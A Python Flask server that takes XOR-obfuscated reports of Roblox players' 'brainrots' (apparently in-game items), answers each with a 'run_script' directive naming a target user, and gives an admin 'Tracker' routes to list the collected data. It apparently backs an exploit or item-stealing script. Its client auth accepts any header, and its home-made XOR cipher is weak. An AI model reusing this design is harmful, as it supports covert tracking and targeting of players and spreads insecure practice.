from flask import Flask, request, jsonify
import os
import json
import base64
import threading

app = Flask(__name__)

# ==============================
# ENVIRONMENT VARIABLES
# ==============================
ADMIN_KEY = os.getenv("ADMIN_KEY")
XOR_KEY = os.getenv("XOR_KEY")

if not ADMIN_KEY or not XOR_KEY:
    raise RuntimeError("ADMIN_KEY or XOR_KEY missing")

# ==============================
# IN-MEMORY STORAGE
# ==============================
users_data = {}
lock = threading.Lock()

# ==============================
# XOR + BASE64 HELPERS
# ==============================
def xor_encrypt(data: str, key: str) -> str:
    raw = bytearray()
    key_bytes = key.encode()
    for i, b in enumerate(data.encode()):
        raw.append(b ^ key_bytes[i % len(key_bytes)])
    return base64.b64encode(raw).decode()

def xor_decrypt(data: str, key: str) -> str:
    raw = base64.b64decode(data)
    out = bytearray()
    key_bytes = key.encode()
    for i, b in enumerate(raw):
        out.append(b ^ key_bytes[i % len(key_bytes)])
    return out.decode()

# ==============================
# AUTH
# ==============================
def require_admin(req):
    return req.headers.get("Authorization") == ADMIN_KEY

def require_client(req):
    return req.headers.get("Authorization") is not None

# ==============================
# ROUTES
# ==============================
@app.route("/", methods=["GET"])
def home():
    return "API ONLINE"

# Roblox → API (POST)
@app.route("/users/<username>/brainrots", methods=["POST"])
def post_brainrots(username):
    if not require_client(request):
        return "Unauthorized", 401

    try:
        decrypted = xor_decrypt(request.data.decode(), XOR_KEY)
        payload = json.loads(decrypted)
    except Exception:
        return "Bad payload", 400

    with lock:
        users_data[username] = {
            "brainrots": payload,
            "run_script": True,
            "target_user": username
        }

    response = xor_encrypt(json.dumps({
        "run_script": True,
        "target_user": username
    }), XOR_KEY)

    return response

# Tracker → API (GET)
@app.route("/users", methods=["GET"])
def list_users():
    if not require_admin(request):
        return "Unauthorized", 401

    with lock:
        result = {"users": list(users_data.keys())}

    return xor_encrypt(json.dumps(result), XOR_KEY)

# Tracker → API (GET)
@app.route("/users/<username>/brainrots", methods=["GET"])
def get_brainrots(username):
    if not require_admin(request):
        return "Unauthorized", 401

    with lock:
        data = users_data.get(username)

    if not data:
        return xor_encrypt(json.dumps([]), XOR_KEY)

    return xor_encrypt(json.dumps(data["brainrots"]), XOR_KEY)

# ==============================
# START SERVER
# ==============================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
